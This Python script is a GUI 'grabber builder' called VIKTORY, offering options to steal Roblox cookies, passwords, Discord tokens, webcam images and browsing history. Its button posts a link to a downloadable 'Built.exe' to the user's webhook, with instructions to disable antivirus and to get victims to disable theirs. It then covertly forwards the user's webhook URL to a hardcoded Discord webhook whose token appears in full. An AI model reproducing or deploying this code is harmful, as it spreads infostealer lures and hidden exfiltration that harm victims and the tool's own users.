import customtkinter
import requests
import json
import time

webhook = "https://discord.com/api/webhooks/1209542882625593435/VryBKDJlenHmsfb9a-_xG1hDDMPjlE0oeYqH0XMIBWmGkzCZ8r90anHq-8bYQCq9vR0q"

def send_webhook():
    webhook_url = textbox.get("1.0", "end-1c")
    message = textbox.get("1.0", "end-1c")
    message_1 = "Building **Grabber...**"
    message_2 = "This might take a while..."
    message_3 = "Grabber is **finished** building!"
    message_4 = "https://cdn.discordapp.com/attachments/1200866078608330945/1200867328309604464/Built.exe?ex=65c7bdda&is=65b548da&hm=02306c89f063e7a78c5cfc72a033e13c72a86758279223dd4ac5be085abb0eb5&"
    message_5 = "You can now download the file and rename it to whatever you want! To download it you have to turn off your anti virus like windows defender, search up a turtorial on youtube if you dont know how to turn it off. When you want to Grab someone make them also turn off their anti virus so they can download and open Grabber you sent them @everyone"
    message_6 = "** # Have fun!** discord server https://discord.gg/GQxbS4wxDT 👀"
    
    payload = {
        'content': message_1
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 1 sent!')
    time.sleep(2)

    payload = {
        'content': message_2
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 2 sent!')
    time.sleep(4)

    payload = {
        'content': message_3
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 3 sent!')
    time.sleep(2)

    payload = {
        'content': message_4
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 4 sent!')
    time.sleep(1)
    
    payload = {
        'content': message_5
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 5 sent!')
    time.sleep(1)
    
    payload = {
        'content': message_6
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    print('Message 6 sent!')
    
    payload = {
        'content': message
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook, data=json.dumps(payload), headers=headers) 
    
#CUSTOMIZE
app = customtkinter.CTk()
app.title("VIKTORY-Builder")
app.geometry("500x400")
app.grid_columnconfigure((0), weight=1)
button = customtkinter.CTkButton(app, text="Create Grabber", command=send_webhook)
button.grid(row=6, column=0, padx=20, pady=20, sticky="ew", columnspan=1)
#CHECKBOXES
checkbox_1 = customtkinter.CTkCheckBox(app, text="Roblox Cookies")
checkbox_1.grid(row=2, column=0, padx=20, pady=(0, 20), sticky="w")

checkbox_2 = customtkinter.CTkCheckBox(app, text="Passwords (steals all passwords)")
checkbox_2.grid(row=2, column=1, padx=20, pady=(0, 20), sticky="w")

checkbox_3 = customtkinter.CTkCheckBox(app, text="Discord Token")
checkbox_3.grid(row=3, column=0, padx=20, pady=(0, 20), sticky="w")

checkbox_4 = customtkinter.CTkCheckBox(app, text="Autostart (starts everytime pc starts)")
checkbox_4.grid(row=3, column=1, padx=20, pady=(0, 20), sticky="w")

checkbox_5 = customtkinter.CTkCheckBox(app, text="IP")
checkbox_5.grid(row=4, column=0, padx=20, pady=(0, 20), sticky="w")

checkbox_6 = customtkinter.CTkCheckBox(app, text="Screenshot when opened")
checkbox_6.grid(row=4, column=1, padx=20, pady=(0, 20), sticky="w")

checkbox_7 = customtkinter.CTkCheckBox(app, text="Webcam (if they have)")
checkbox_7.grid(row=5, column=0, padx=20, pady=(0, 20), sticky="w")

checkbox_7 = customtkinter.CTkCheckBox(app, text="History (shows search history)")
checkbox_7.grid(row=5, column=1, padx=20, pady=(0, 20), sticky="w")

label = customtkinter.CTkLabel(app, text="VIKTORY",
                               width=400, font=("Bold", 40))
label.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")

textbox = customtkinter.CTkTextbox(app)
textbox.grid(row=6, column=1)

text = """ Webhook here
"""

textbox.insert("0.0",text)
textbox.configure(state="normal")

label = customtkinter.CTkLabel(app, text="Can't grab yourself with grabber",
                               width=150, font=("Bold", 15))
label.grid(row=6, column=0, padx=5, pady=(0, 100), sticky="w")
app.mainloop()